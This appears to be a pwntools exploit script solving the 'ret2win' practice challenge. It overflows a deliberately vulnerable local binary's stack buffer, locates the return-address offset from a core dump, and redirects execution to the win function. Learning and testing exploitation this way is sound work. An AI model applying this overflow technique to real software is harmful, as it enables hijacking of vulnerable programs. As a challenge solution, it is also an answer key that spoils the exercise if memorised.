from pwn import *

p = process("./ret2win")
e = ELF("./ret2win")

ret_addr = e.symbols["ret2win"]

# Crash the program
p.recvuntil(b">")
p.sendline(cyclic(50))
p.wait()

# Read the corefile to find the offset to RIP
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))

payload = b'A' * offset
payload += p64(ret_addr)

p = process("./ret2win")
p.recvuntil(b">")
p.sendline(payload)
p.interactive()
